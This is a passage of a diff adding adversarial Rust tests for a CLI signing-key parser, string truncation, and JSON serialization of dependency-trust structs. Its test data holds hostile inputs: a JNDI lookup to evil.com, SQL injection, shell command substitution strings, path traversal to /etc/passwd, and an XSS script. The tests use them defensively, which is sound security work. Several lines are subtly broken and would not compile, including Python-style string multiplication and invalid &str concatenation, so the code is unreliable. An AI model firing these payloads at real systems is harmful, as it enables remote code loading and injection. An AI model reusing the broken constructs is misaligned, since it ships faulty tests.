+                        assert_eq!(signing_key.to_bytes(), expected_key.to_bytes(),
+                                 "Attack {} should produce expected key if valid", i);
+                    }
+                    None => {
+                        // Rejection is acceptable for malformed keys
+                    }
+                }
+            }
+
+            // Attack 2: Hex encoding manipulation and injection
+            let hex_injection_attacks = vec![
+                "0x",                              // Empty hex
+                "0x4",                             // Single hex digit
+                "0x" + &"g".repeat(64),           // Invalid hex characters
+                "0x" + &"41".repeat(32) + "INJECTION", // Valid hex + injection
+                "0X" + &"42".repeat(32),          // Uppercase prefix
+                "0x" + &"43_44_45".repeat(10) + "46", // Underscores
+                "0x" + &"47:48:49".repeat(10) + "4a", // Colons
+                "0x" + &"4b-4c-4d".repeat(10) + "4e", // Hyphens
+                &"4f".repeat(32),                 // No prefix
+                "0x" + &"50\n51\t52".repeat(10) + "53", // Control chars
+            ];
+
+            for hex_attack in hex_injection_attacks {
+                let parse_result = parse_signing_key_from_blob(hex_attack.as_bytes());
+
+                // System should either parse validly or reject safely
+                if let Some(signing_key) = parse_result {
+                    assert_eq!(signing_key.to_bytes().len(), 32,
+                             "Hex attack '{}' should produce valid 32-byte key", hex_attack);
+                }
+            }
+
+            // Attack 3: Base64 encoding attacks and manipulation
+            let valid_key_bytes = [0x55; 32];
+            let valid_b64 = base64::engine::general_purpose::STANDARD.encode(valid_key_bytes);
+
+            let base64_attacks = vec![
+                valid_b64.clone(),                          // Valid base64
+                valid_b64.clone() + "INJECTION",           // Valid + injection
+                valid_b64.replace('+', '-'),               // Character substitution
+                valid_b64.replace('/', '_'),               // URL-safe variant
+                valid_b64.trim_end_matches('=').to_string(), // No padding
+                valid_b64 + "===",                         // Extra padding
+                "Z".repeat(44),                            // All same character
+                "AAAA".repeat(11),                         // Repeated pattern
+                valid_b64.to_lowercase(),                  // Case change
+                valid_b64.to_uppercase(),                  // Case change
+                format!("{}\n{}", &valid_b64[..22], &valid_b64[22..]), // Newline split
+            ];
+
+            for (i, b64_attack) in base64_attacks.iter().enumerate() {
+                let parse_result = parse_signing_key_from_blob(b64_attack.as_bytes());
+
+                if let Some(signing_key) = parse_result {
+                    assert_eq!(signing_key.to_bytes().len(), 32,
+                             "Base64 attack {} should produce valid key", i);
+                }
+            }
+
+            // Attack 4: Keypair format manipulation (64-byte inputs)
+            let valid_seed = [0x66; 32];
+            let valid_signing_key = ed25519_dalek::SigningKey::from_bytes(&valid_seed);
+            let valid_verifying_key = valid_signing_key.verifying_key().to_bytes();
+            let mut valid_keypair = [0u8; 64];
+            valid_keypair[..32].copy_from_slice(&valid_seed);
+            valid_keypair[32..].copy_from_slice(&valid_verifying_key);
+
+            let keypair_attacks = vec![
+                valid_keypair,                                    // Valid keypair
+                {let mut attack = valid_keypair; attack[32] ^= 1; attack}, // Corrupted verifying key
+                {let mut attack = [0u8; 64]; attack[..32].copy_from_slice(&valid_seed); attack}, // Zero verifying key
+                [0xFF; 64],                                      // All ones
+                [0x00; 64],                                      // All zeros
+                {let mut attack = [0u8; 64]; attack[..32].copy_from_slice(&[0x77; 32]); attack[32..].copy_from_slice(&[0x88; 32]); attack}, // Mismatched
+            ];
+
+            for (i, keypair_bytes) in keypair_attacks.iter().enumerate() {
+                let parse_result = parse_signing_key_from_blob(keypair_bytes);
+
+                match parse_result {
+                    Some(signing_key) => {
+                        // If parsing succeeded, verify consistency
+                        assert_eq!(signing_key.to_bytes().len(), 32,
+                                 "Keypair attack {} should produce valid signing key", i);
+
+                        // For valid format, verify the keypair matches
+                        if i == 0 {
+                            assert_eq!(signing_key.to_bytes(), valid_seed,
+                                     "Valid keypair should produce expected signing key");
+                        }
+                    }
+                    None => {
+                        // Rejection is expected for invalid keypairs
+                        if i == 0 {
+                            panic!("Valid keypair should not be rejected");
+                        }
+                    }
+                }
+            }
+
+            // Attack 5: Format confusion and mixed encoding attacks
+            let format_confusion_attacks = vec![(
+                b"0x424344454647484950515253545556575859606162636465666768697071".to_vec(), "Hex format"
+            ), (
+                BASE64_STANDARD.encode([0x11; 32]).into_bytes(), "Base64 format"
+            ), (
+                [0x22; 32].to_vec(), "Raw bytes"
+            ), (
+                b"data:application/octet-stream;base64,".to_vec()
+                    .into_iter()
+                    .chain(BASE64_STANDARD.encode([0x33; 32]).into_bytes())
+                    .collect(), "Data URL"
+            ), (
+                b"-----BEGIN PRIVATE KEY-----\n".to_vec()
+                    .into_iter()
+                    .chain(BASE64_STANDARD.encode([0x44; 32]).into_bytes())
+                    .chain(b"\n-----END PRIVATE KEY-----".to_vec())
+                    .collect(), "PEM-like format"
+            )];
+
+            for (attack_data, description) in format_confusion_attacks {
+                let parse_result = parse_signing_key_from_blob(&attack_data);
+
+                // System should handle format confusion safely
+                if let Some(signing_key) = parse_result {
+                    assert_eq!(signing_key.to_bytes().len(), 32,
+                             "{} should produce valid key if parsed", description);
+                } else {
+                    // Rejection of complex formats is acceptable
+                }
+            }
+        }
+
+        #[test]
+        fn test_utf8_prefix_boundary_and_unicode_attacks() {
+            // Attack 1: Basic boundary testing
+            let test_string = "Hello, World!";
+
+            // Boundary values
+            assert_eq!(api::utf8_prefix(test_string, 0), "");
+            assert_eq!(api::utf8_prefix(test_string, 1), "H");
+            assert_eq!(api::utf8_prefix(test_string, test_string.chars().count()), test_string);
+            assert_eq!(api::utf8_prefix(test_string, test_string.chars().count() + 100), test_string);
+            assert_eq!(api::utf8_prefix(test_string, usize::MAX), test_string);
+
+            // Attack 2: Unicode boundary attacks
+            let unicode_attacks = vec![
+                ("café", 4, "café"),                    // Basic UTF-8
+                ("café", 3, "caf"),                     // Cut before accent
+                ("🦀🔒⚡", 2, "🦀🔒"),                    // Emoji boundary
+                ("🦀🔒⚡", 1, "🦀"),                     // Single emoji
+                ("\u{0041}\u{0300}", 1, "À"),          // Combining character (should handle gracefully)
+                ("Ελληνικά", 3, "Ελλ"),                // Greek text
+                ("中文测试", 2, "中文"),                 // Chinese characters
+                ("مرحبا", 2, "مر"),                     // Arabic text
+                ("𝕌𝕟𝕚𝕔𝕠𝕕𝕖", 2, "𝕌𝕟"),                 // Mathematical symbols
+                ("test\u{200B}invisible", 5, "test\u{200B}"), // Zero-width space
+                ("direction\u{202E}override", 10, "direction\u{202E}"), // Text direction override
+            ];
+
+            for (input, max_chars, expected) in unicode_attacks {
+                let result = api::utf8_prefix(input, max_chars);
+
+                // Should not panic and should handle UTF-8 correctly
+                assert!(result.len() <= input.len(),
+                       "Result should not be longer than input for '{}' with max {}", input, max_chars);
+
+                // Should be valid UTF-8
+                assert!(result.is_ascii() || std::str::from_utf8(result.as_bytes()).is_ok(),
+                       "Result should be valid UTF-8 for '{}' with max {}", input, max_chars);
+
+                // Character count should not exceed max_chars
+                assert!(result.chars().count() <= max_chars,
+                       "Character count should not exceed {} for '{}', got {} chars in '{}'",
+                       max_chars, input, result.chars().count(), result);
+            }
+
+            // Attack 3: Edge case string content
+            let edge_case_strings = vec![
+                "",                                     // Empty string
+                "\0",                                   // Null byte
+                "\u{FEFF}",                            // BOM
+                "\n\r\t",                              // Control characters
+                " \t\n\r ",                            // Whitespace
+                "\x7F".repeat(10),                     // DEL characters
+                "\u{202A}\u{202B}\u{202C}",           // Text direction controls
+                "normal\u{0000}null",                 // Embedded null
+                "test\x1b[31mcolor\x1b[0m",           // ANSI escape sequences
+                "🦀".repeat(1000),                     // Large unicode
+                "a".repeat(100000),                    // Large ASCII
+            ];
+
+            for edge_string in edge_case_strings {
+                for &max_chars in &[0, 1, 5, 100, 1000, usize::MAX] {
+                    let result = api::utf8_prefix(edge_string, max_chars);
+
+                    // Should not panic
+                    assert!(result.chars().count() <= max_chars,
+                           "Edge case '{}' with max {} should respect character limit",
+                           edge_string.escape_debug(), max_chars);
+
+                    // Should be valid prefix
+                    assert!(edge_string.starts_with(result),
+                           "Result should be prefix of input for edge case '{}'",
+                           edge_string.escape_debug());
+                }
+            }
+
+            // Attack 4: Performance stress testing
+            let large_string = "x".repeat(1_000_000);
+            for &max_chars in &[0, 1, 100, 10000, 500000, usize::MAX] {
+                let start = std::time::Instant::now();
+                let result = api::utf8_prefix(&large_string, max_chars);
+                let duration = start.elapsed();
+
+                // Should complete quickly (within reasonable time)
+                assert!(duration.as_millis() < 1000,
+                       "Large string processing should be fast, took {:?} for {} chars", duration, max_chars);
+
+                assert!(result.chars().count() <= max_chars,
+                       "Large string should respect character limit");
+            }
+
+            // Attack 5: Integer overflow attempts
+            let overflow_test_cases = vec![
+                (usize::MAX, "Should handle maximum usize"),
+                (usize::MAX - 1, "Should handle near maximum"),
+                (usize::MAX / 2, "Should handle half maximum"),
+            ];
+
+            for (max_chars, description) in overflow_test_cases {
+                let test_input = "test_overflow_handling";
+                let result = api::utf8_prefix(test_input, max_chars);
+
+                // Should not panic with large values
+                assert_eq!(result, test_input, "{}", description);
+            }
+        }
+
+        #[test]
+        fn test_struct_serialization_injection_and_tampering_attacks() {
+            // Attack 1: VerifyContractOutput JSON injection
+            let contract_output = VerifyContractOutput {
+                command: r#"verify","injection":"malicious"#.to_string(),
+                contract_version: "1.0.0".to_string(),
+                schema_version: "v1".to_string(),
+                compat_version: Some(42),
+                verdict: "PASS".to_string(),
+                status: "SUCCESS".to_string(),
+                exit_code: 0,
+                reason: r#"Valid","evil_field":"injected_value"#.to_string(),
+                details: Some(serde_json::json!({
+                    "test": "value",
+                    "injection": {"attempt": "malicious"}
+                })),
+            };
+
+            let serialization_result = serde_json::to_string(&contract_output);
+            assert!(serialization_result.is_ok(), "Serialization should succeed");
+
+            let json_str = serialization_result.unwrap();
+
+            // Verify JSON injection is properly escaped
+            assert!(!json_str.contains(r#""injection":"malicious""#),
+                   "JSON injection should be escaped in command field");
+            assert!(!json_str.contains(r#""evil_field":"injected_value""#),
+                   "JSON injection should be escaped in reason field");
+
+            // Attack 2: RunDependencyTrustResult with malicious content
+            let malicious_dependency = RunDependencyTrustResult {
+                dependency_name: "../../../etc/passwd".to_string(),
+                version_requirement: "${jndi:ldap://evil.com}".to_string(),
+                section: "dependencies".to_string(),
+                extension_id: "<script>alert('xss')</script>".to_string(),
+                status: RunDependencyTrustStatus::Quarantined,
+                trust_card_version: Some(u64::MAX),
+                risk_level: Some("CRITICAL".to_string()),
+                detail: "Malicious\ndetail\r\nwith\tcontrol\x00chars".to_string(),
+            };
+
+            let dep_serialization = serde_json::to_string(&malicious_dependency);
+            assert!(dep_serialization.is_ok(), "Malicious dependency should serialize safely");
+
+            let dep_json = dep_serialization.unwrap();
+
+            // Verify malicious content is preserved but escaped
+            assert!(dep_json.contains("../../../etc/passwd"),
+                   "Path traversal should be preserved as string");
+            assert!(dep_json.contains("${jndi:ldap://evil.com}"),
+                   "JNDI injection should be preserved as string");
+            assert!(dep_json.contains("<script>alert('xss')</script>"),
+                   "XSS attempt should be preserved as string");
+
+            // Attack 3: TrustScanReport with extreme values
+            let extreme_scan_report = TrustScanReport {
+                command: "scan".to_string(),
+                project_root: "/".repeat(10000),
+                registry_path: "C:\\Windows\\System32".to_string(),
+                scanned_dependencies: usize::MAX,
+                created_cards: usize::MAX,
+                skipped_existing: usize::MAX,
+                lockfile_entries: usize::MAX,
+                deep: true,
+                audit: true,
+                warnings: vec![
+                    "Warning 1".to_string(),
+                    "🦀".repeat(1000),
+                    "\x00\x01\xFF".repeat(100),
+                ],
+                items: (0..10000).map(|i| TrustScanItem {
+                    dependency_name: format!("package_{}", i),
+                    section: "deps".to_string(),
+                    extension_id: format!("ext_{}", i),
+                    extension_version: format!("v{}.{}.{}", i/100, i/10 % 10, i % 10),
+                    status: if i % 2 == 0 { TrustScanItemStatus::Created } else { TrustScanItemStatus::SkippedExisting },
+                    publisher_id: format!("publisher_{}", i % 100),
+                    risk_level: if i % 3 == 0 { "HIGH" } else { "LOW" }.to_string(),
+                    integrity_hash_count: i % 20,
+                    vulnerability_count: i % 5,
+                    dependent_count: Some(i as u64),
+                }).collect(),
+            };
+
+            let extreme_serialization = serde_json::to_string(&extreme_scan_report);
+            assert!(extreme_serialization.is_ok(), "Extreme values should serialize");
+
+            let extreme_json = extreme_serialization.unwrap();
+            assert!(!extreme_json.is_empty(), "Extreme serialization should produce output");
+
+            // Attack 4: Ed25519SigningMaterial path manipulation
+            let malicious_paths = vec![
+                PathBuf::from(""),
+                PathBuf::from("/"),
+                PathBuf::from("../../../etc/passwd"),
+                PathBuf::from("C:\\Windows\\System32\\cmd.exe"),
+                PathBuf::from("/dev/null"),
+                PathBuf::from("/proc/self/mem"),
+                PathBuf::from("\\\\?\\C:\\"),
+                PathBuf::from("file:///etc/passwd"),
+                PathBuf::from("🦀".repeat(100)),
+                PathBuf::from("\x00\x01\xFF".repeat(10)),
+            ];
+
+            for (i, malicious_path) in malicious_paths.iter().enumerate() {
+                let signing_material = Ed25519SigningMaterial {
+                    path: malicious_path.clone(),
+                    source: "test",
+                    signing_key: ed25519_dalek::SigningKey::from_bytes(&[i as u8; 32]),
+                };
+
+                // Should handle malicious paths safely
+                assert_eq!(signing_material.path, *malicious_path,
+                          "Path should be preserved for attack {}", i);
+                assert_eq!(signing_material.source, "test",
+                          "Source should be preserved for attack {}", i);
+            }
+
+            // Attack 5: RunPackageDependency field injection
+            let dependency_injections = vec![
+                RunPackageDependency {
+                    dependency_name: "normal-package".to_string(),
+                    version_requirement: "^1.0.0".to_string(),
+                    section: "dependencies".to_string(),
+                    extension_id: "normal-ext".to_string(),
+                },
+                RunPackageDependency {
+                    dependency_name: "".to_string(),  // Empty name
+                    version_requirement: "".to_string(),
+                    section: "".to_string(),
+                    extension_id: "".to_string(),
+                },
+                RunPackageDependency {
+                    dependency_name: "\n\r\t".to_string(),  // Control characters
+                    version_requirement: ">=0.0.0, <999.999.999".to_string(),
+                    section: "dev-dependencies".to_string(),
+                    extension_id: "control-chars-ext".to_string(),
+                },
+                RunPackageDependency {
+                    dependency_name: "very-long-".to_string() + &"x".repeat(10000),
+                    version_requirement: "*".to_string(),
+                    section: "dependencies".to_string(),
+                    extension_id: "long-name-ext".to_string(),
+                },
+            ];
+
+            for (i, dependency) in dependency_injections.iter().enumerate() {
+                let dep_serialization = serde_json::to_string(dependency);
+                assert!(dep_serialization.is_ok(),
+                       "Dependency injection {} should serialize", i);
+
+                // Verify structure is preserved
+                assert_eq!(dependency.dependency_name, dependency_injections[i].dependency_name);
+                assert_eq!(dependency.version_requirement, dependency_injections[i].version_requirement);
+            }
+        }
+
+        #[test]
+        fn test_enum_serialization_and_variant_attacks() {
+            // Attack 1: RunDependencyTrustStatus serialization consistency
+            let trust_statuses = vec![
+                RunDependencyTrustStatus::Trusted,
+                RunDependencyTrustStatus::Untracked,
+                RunDependencyTrustStatus::Revoked,
+                RunDependencyTrustStatus::Quarantined,
+            ];
+
+            for status in trust_statuses {
+                let serialization_result = serde_json::to_string(&status);
+                assert!(serialization_result.is_ok(),
+                       "Trust status {:?} should serialize", status);
+
+                let json_str = serialization_result.unwrap();
+                let deserialization_result: Result<RunDependencyTrustStatus, _> = serde_json::from_str(&json_str);
+                assert!(deserialization_result.is_ok(),
+                       "Trust status should round-trip serialize/deserialize");
+
+                let deserialized = deserialization_result.unwrap();
+                assert_eq!(status, deserialized,
+                          "Round-trip should preserve trust status");
+            }
+
+            // Attack 2: TrustScanItemStatus variant manipulation
+            let scan_statuses = vec![
+                TrustScanItemStatus::Created,
+                TrustScanItemStatus::SkippedExisting,
+            ];
+
+            for status in scan_statuses {
+                let serialization_result = serde_json::to_string(&status);
+                assert!(serialization_result.is_ok(),
+                       "Scan status {:?} should serialize", status);
+
+                // Verify snake_case serialization
+                let json_str = serialization_result.unwrap();
+                match status {
+                    TrustScanItemStatus::Created => {
+                        assert!(json_str.contains("created"),
+                               "Created status should serialize as 'created'");
+                    }
+                    TrustScanItemStatus::SkippedExisting => {
+                        assert!(json_str.contains("skipped_existing"),
+                               "SkippedExisting should serialize as 'skipped_existing'");
+                    }
+                }
+            }
+
+            // Attack 3: Invalid enum variant injection through JSON
+            let invalid_trust_status_jsons = vec![
+                r#""unknown""#,
+                r#""TRUSTED""#,  // Wrong case
+                r#""trusted_but_suspicious""#,
+                r#"null"#,
+                r#""""#,  // Empty string
+                r#""malicious_variant""#,
+                r#"42"#,  // Number instead of string
+                r#"{"variant": "trusted"}"#,  // Object instead of string
+            ];
+
+            for invalid_json in invalid_trust_status_jsons {
+                let parse_result: Result<RunDependencyTrustStatus, _> = serde_json::from_str(invalid_json);
+                assert!(parse_result.is_err(),
+                       "Invalid trust status JSON '{}' should fail to parse", invalid_json);
+            }
+
+            let invalid_scan_status_jsons = vec![
+                r#""pending""#,
+                r#""Created""#,  // Wrong case
+                r#""created_with_errors""#,
+                r#"[]"#,  // Array instead of string
+            ];
+
+            for invalid_json in invalid_scan_status_jsons {
+                let parse_result: Result<TrustScanItemStatus, _> = serde_json::from_str(invalid_json);
+                assert!(parse_result.is_err(),
+                       "Invalid scan status JSON '{}' should fail to parse", invalid_json);
+            }
+
+            // Attack 4: Enum variant boundary testing in complex structures
+            let boundary_test_items = vec![
+                TrustScanItem {
+                    dependency_name: "test".to_string(),
+                    section: "deps".to_string(),
+                    extension_id: "ext".to_string(),
+                    extension_version: "1.0.0".to_string(),
+                    status: TrustScanItemStatus::Created,
+                    publisher_id: "pub".to_string(),
+                    risk_level: "LOW".to_string(),
+                    integrity_hash_count: 0,
+                    vulnerability_count: 0,
+                    dependent_count: None,
+                },
+                TrustScanItem {
+                    dependency_name: "test2".to_string(),
+                    section: "deps".to_string(),
+                    extension_id: "ext2".to_string(),
+                    extension_version: "2.0.0".to_string(),
+                    status: TrustScanItemStatus::SkippedExisting,
+                    publisher_id: "pub2".to_string(),
+                    risk_level: "HIGH".to_string(),
+                    integrity_hash_count: usize::MAX,
+                    vulnerability_count: usize::MAX,
+                    dependent_count: Some(u64::MAX),
+                },
+            ];
+
+            for (i, item) in boundary_test_items.iter().enumerate() {
+                let serialization_result = serde_json::to_string(item);
+                assert!(serialization_result.is_ok(),
+                       "Boundary test item {} should serialize", i);
+
+                let json_str = serialization_result.unwrap();
+                let deserialization_result: Result<TrustScanItem, _> = serde_json::from_str(&json_str);
+                assert!(deserialization_result.is_ok(),
+                       "Boundary test item {} should deserialize", i);
+
+                let deserialized = deserialization_result.unwrap();
+                assert_eq!(item.status, deserialized.status,
+                          "Enum status should be preserved in boundary test {}", i);
+            }
+
+            // Attack 5: Concurrent enum access simulation
+            let concurrent_operations: Vec<_> = (0..1000).map(|i| {
+                let status = match i % 4 {
+                    0 => RunDependencyTrustStatus::Trusted,
+                    1 => RunDependencyTrustStatus::Untracked,
+                    2 => RunDependencyTrustStatus::Revoked,
+                    _ => RunDependencyTrustStatus::Quarantined,
+                };
+
+                let scan_status = if i % 2 == 0 {
+                    TrustScanItemStatus::Created
+                } else {
+                    TrustScanItemStatus::SkippedExisting
+                };
+
+                (status, scan_status)
+            }).collect();
+
+            // Simulate rapid serialization/deserialization
+            for (i, (trust_status, scan_status)) in concurrent_operations.iter().enumerate() {
+                let trust_json = serde_json::to_string(trust_status).unwrap();
+                let scan_json = serde_json::to_string(scan_status).unwrap();
+
+                let trust_parsed: RunDependencyTrustStatus = serde_json::from_str(&trust_json).unwrap();
+                let scan_parsed: TrustScanItemStatus = serde_json::from_str(&scan_json).unwrap();
+
+                assert_eq!(*trust_status, trust_parsed,
+                          "Concurrent operation {} should preserve trust status", i);
+                assert_eq!(*scan_status, scan_parsed,
+                          "Concurrent operation {} should preserve scan status", i);
+            }
+        }
+
+        #[test]
+        fn test_base64_and_hex_encoding_security_attacks() {
+            // Attack 1: Base64 engine security comparison
+            let test_data = b"Security test data with special chars: \x00\xFF\x7F!@#$%^&*()";
+
+            let engines = vec![
+                base64::engine::general_purpose::STANDARD,
+                base64::engine::general_purpose::STANDARD_NO_PAD,
+                base64::engine::general_purpose::URL_SAFE,
+                base64::engine::general_purpose::URL_SAFE_NO_PAD,
+            ];
+
+            let mut encoded_variants = Vec::new();
+            for engine in &engines {
+                let encoded = engine.encode(test_data);
+                encoded_variants.push(encoded);
+            }
+
+            // Each engine should produce different encodings for special characters
+            for (i, encoded1) in encoded_variants.iter().enumerate() {
+                for (j, encoded2) in encoded_variants.iter().enumerate() {
+                    if i != j {
+                        // Different engines may produce different encodings
+                        // But all should decode back to the same data
+                        if let Ok(decoded1) = engines[i].decode(encoded1) {
+                            if let Ok(decoded2) = engines[j].decode(encoded2) {
+                                if decoded1 == test_data && decoded2 == test_data {
+                                    // Both decoded correctly to original data
+                                    continue;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            // Attack 2: Hex decoding with malicious patterns
+            let hex_attack_patterns = vec![
+                ("", "Empty hex string"),
+                ("0", "Odd length hex"),
+                ("gg", "Invalid hex characters"),
+                ("0x41", "Hex with prefix"),
+                ("41424344454647", "Odd length valid hex"),
+                ("41_42_43_44", "Hex with separators"),
+                ("41:42:43:44", "Hex with colons"),
+                ("41-42-43-44", "Hex with dashes"),
+                ("41 42 43 44", "Hex with spaces"),
+                ("\n41\t42\r43\n44\n", "Hex with control chars"),
+                ("4141414141414141" * 1000, "Very long hex"),
+                ("DEADBEEF" * 1000, "Repeating pattern"),
+                ("00" * 10000, "All zeros"),
+                ("FF" * 10000, "All ones"),
+            ];
+
+            for (hex_input, description) in hex_attack_patterns {
+                let decode_result = hex::decode(hex_input);
+
+                match decode_result {
+                    Ok(decoded) => {
+                        // If decoding succeeded, verify it's reasonable
+                        assert!(decoded.len() <= hex_input.len(),
+                               "{} should not decode to longer data", description);
+
+                        // Re-encode should be consistent (modulo case/formatting)
+                        let re_encoded = hex::encode(&decoded);
+                        let normalized_original = hex_input.chars()
+                            .filter(|c| c.is_ascii_hexdigit())
+                            .collect::<String>()
+                            .to_lowercase();
+
+                        if hex_input.len() % 2 == 0 && hex_input.chars().all(|c| c.is_ascii_hexdigit()) {
+                            assert_eq!(re_encoded, normalized_original,
+                                     "{} should round-trip consistently", description);
+                        }
+                    }
+                    Err(_) => {
+                        // Decoding failure is expected for malformed input
+                    }
+                }
+            }
+
+            // Attack 3: Base64 padding manipulation attacks
+            let padding_attacks = vec![
+                ("QQ", "No padding needed"),
+                ("QQ=", "Single padding"),
+                ("QQ==", "Double padding"),
+                ("QQ===", "Triple padding (invalid)"),
+                ("QQ====", "Quadruple padding (invalid)"),
+                ("QUE", "Missing padding"),
+                ("QUE=", "Correct padding"),
+                ("QUE==", "Extra padding"),
+                ("", "Empty base64"),
+                ("=", "Only padding"),
+                ("==", "Only double padding"),
+                ("A", "Single character"),
+                ("AB", "Two characters"),
+                ("ABC", "Three characters"),
+            ];
+
+            for (b64_input, description) in padding_attacks {
+                for engine in &engines {
+                    let decode_result = engine.decode(b64_input);
+
+                    match decode_result {
+                        Ok(decoded) => {
+                            // If successful, should be valid
+                            let re_encoded = engine.encode(&decoded);
+
+                            // For padding engines, verify padding behavior
+                            if matches!(engine, base64::engine::general_purpose::STANDARD |
+                                              base64::engine::general_purpose::URL_SAFE) {
+                                // Should include proper padding
+                                let expected_padding = (4 - (decoded.len() * 4 / 3) % 4) % 4;
+                                assert_eq!(re_encoded.chars().rev().take_while(|&c| c == '=').count(),
+                                          expected_padding,
+                                          "{} should have correct padding", description);
+                            }
+                        }
+                        Err(_) => {
+                            // Failure expected for malformed padding
+                        }
+                    }
+                }
+            }
+
+            // Attack 4: Encoding consistency across multiple operations
+            let consistency_test_data = vec![
+                b"".to_vec(),
+                b"A".to_vec(),
+                b"AB".to_vec(),
+                b"ABC".to_vec(),
+                b"ABCD".to_vec(),
+                b"\x00".to_vec(),
+                b"\xFF".to_vec(),
+                (0..256).map(|i| i as u8).collect(),
+                vec![0x00; 10000],
+                vec![0xFF; 10000],
+                b"The quick brown fox jumps over the lazy dog".to_vec(),
+            ];
+
+            for test_data in consistency_test_data {
+                // Hex consistency
+                let hex_encoded = hex::encode(&test_data);
+                let hex_decoded = hex::decode(&hex_encoded).expect("Hex should round-trip");
+                assert_eq!(test_data, hex_decoded, "Hex encoding should be consistent");
+
+                // Base64 consistency across engines
+                for engine in &engines {
+                    let b64_encoded = engine.encode(&test_data);
+                    let b64_decoded = engine.decode(&b64_encoded).expect("Base64 should round-trip");
+                    assert_eq!(test_data, b64_decoded,
+                             "Base64 encoding should be consistent for {:?}", engine);
+                }
+            }
+
+            // Attack 5: Memory exhaustion through large encoding operations
+            let large_sizes = vec![1024, 10240, 102400, 1024000];
+
+            for size in large_sizes {
+                let large_data = vec![0x42; size];
+
+                // Hex encoding/decoding performance
+                let start = std::time::Instant::now();
+                let hex_encoded = hex::encode(&large_data);
+                let hex_duration = start.elapsed();
+
+                assert!(hex_duration.as_millis() < 1000,
+                       "Hex encoding {} bytes should be fast", size);
+
+                let hex_decoded = hex::decode(&hex_encoded).expect("Large hex should decode");
+                assert_eq!(large_data, hex_decoded, "Large hex should round-trip");
+
+                // Base64 encoding/decoding performance
+                let start = std::time::Instant::now();
+                let b64_encoded = BASE64_STANDARD.encode(&large_data);
+                let b64_duration = start.elapsed();
+
+                assert!(b64_duration.as_millis() < 1000,
+                       "Base64 encoding {} bytes should be fast", size);
+
+                let b64_decoded = BASE64_STANDARD.decode(&b64_encoded)
+                    .expect("Large base64 should decode");
+                assert_eq!(large_data, b64_decoded, "Large base64 should round-trip");
+            }
+        }
+
+        #[test]
+        fn test_cli_structure_validation_and_injection_resistance() {
+            // Attack 1: String field injection resistance testing
+            let malicious_strings = vec![
+                "".to_string(),                                    // Empty
+                "\x00\x01\xFF".to_string(),                       // Binary data
+                "../../etc/passwd".to_string(),                   // Path traversal
+                "${jndi:ldap://evil.com}".to_string(),           // JNDI injection
+                "<script>alert('xss')</script>".to_string(),      // XSS
+                "'; DROP TABLE users; --".to_string(),            // SQL injection
+                "\n\r\t\x1b[31mCOLOR\x1b[0m".to_string(),       // Control chars + ANSI
+                "🦀".repeat(1000),                                // Large Unicode
+                "test with\nnewlines\rand\ttabs".to_string(),     // Multiline
+                "|echo pwned".to_string(),                        // Command injection
+                "$(whoami)".to_string(),                          // Command substitution
+                "`id`".to_string(),                              // Command substitution
+                "normal_value".to_string(),                       // Normal case
+            ];
+
+            // Test PathBuf handling with malicious paths
+            for (i, malicious_str) in malicious_strings.iter().enumerate() {
+                let path = PathBuf::from(malicious_str);
+
+                // PathBuf should handle malicious strings safely
+                assert_eq!(path.to_string_lossy(), *malicious_str,
+                          "PathBuf {} should preserve string content", i);
+
+                // Test path operations don't cause issues
+                let _parent = path.parent();
+                let _filename = path.file_name();
+                let _extension = path.extension();
+
+                // Should not panic on malicious paths
+            }
+
+            // Attack 2: Option<T> field manipulation
+            let option_test_values = vec![
+                Some(0u64),
+                Some(u64::MAX),
+                Some(42),
+                None,
+            ];
+
+            for option_val in option_test_values {
+                // Test serialization of Option fields
+                let test_output = VerifyContractOutput {
+                    command: "test".to_string(),
+                    contract_version: "1.0.0".to_string(),
+                    schema_version: "v1".to_string(),
+                    compat_version: option_val,
+                    verdict: "PASS".to_string(),
+                    status: "OK".to_string(),
+                    exit_code: 0,
+                    reason: "test".to_string(),
+                    details: None,
+                };
+
+                let serialization = serde_json::to_string(&test_output);
+                assert!(serialization.is_ok(),
+                       "Option value {:?} should serialize", option_val);
+            }
+
+            // Attack 3: Numeric field boundary testing
+            let numeric_boundaries = vec![
+                (i32::MIN, "Minimum i32"),
+                (i32::MAX, "Maximum i32"),
+                (0, "Zero"),
+                (-1, "Negative one"),
+                (1, "Positive one"),
+            ];
+
+            for (value, description) in numeric_boundaries {
+                let output_with_exit_code = VerifyContractOutput {
+                    command: "boundary_test".to_string(),
+                    contract_version: "1.0.0".to_string(),
+                    schema_version: "v1".to_string(),
+                    compat_version: None,
+                    verdict: "UNKNOWN".to_string(),
+                    status: "TESTING".to_string(),
+                    exit_code: value,
+                    reason: description.to_string(),
+                    details: None,
+                };
+
+                // Should handle extreme exit codes
+                assert_eq!(output_with_exit_code.exit_code, value,
+                          "{} should be preserved", description);
+
+                let serialization = serde_json::to_string(&output_with_exit_code);
+                assert!(serialization.is_ok(),
+                       "{} should serialize", description);
+            }
+
+            // Attack 4: JSON Value field injection through details
+            let json_injection_details = vec![
+                None,
+                Some(serde_json::json!(null)),
+                Some(serde_json::json!("")),
+                Some(serde_json::json!("string_value")),
+                Some(serde_json::json!(42)),
+                Some(serde_json::json!(true)),
+                Some(serde_json::json!([])),
+                Some(serde_json::json!({})),
+                Some(serde_json::json!({
+                    "normal": "value",
+                    "injection": "attempt",
+                    "nested": {
+                        "deep": ["array", "values"]
+                    }
+                })),
+                Some(serde_json::json!({
+                    "malicious": "../../../etc/passwd",
+                    "evil": "${jndi:ldap://evil.com}",
+                    "xss": "<script>alert('xss')</script>"
+                })),
+                Some(serde_json::json!(vec!["a"; 10000])), // Large array
+            ];
+
+            for (i, details) in json_injection_details.iter().enumerate() {
+                let output_with_details = VerifyContractOutput {
+                    command: "injection_test".to_string(),
+                    contract_version: "1.0.0".to_string(),
+                    schema_version: "v1".to_string(),
+                    compat_version: None,
+                    verdict: "TESTING".to_string(),
+                    status: "IN_PROGRESS".to_string(),
+                    exit_code: 0,
+                    reason: format!("Test case {}", i),
+                    details: details.clone(),
+                };
+
+                let serialization = serde_json::to_string(&output_with_details);
+                assert!(serialization.is_ok(),
+                       "Details injection test {} should serialize", i);
+
+                if let Some(ref detail_value) = details {
+                    let json_str = serialization.unwrap();
+
+                    // Verify details are properly nested and escaped
+                    assert!(json_str.contains("\"details\":"),
+                           "Details field should be present in JSON");
+
+                    // Should not contain unescaped injection attempts
+                    if detail_value.is_object() {
+                        // Complex objects should be properly serialized
+                        assert!(!json_str.contains("\"malicious\":\"../../../etc/passwd\"details\":"),
+                               "JSON structure should not be corrupted by injection");
+                    }
+                }
+            }
+
+            // Attack 5: Nested structure consistency verification
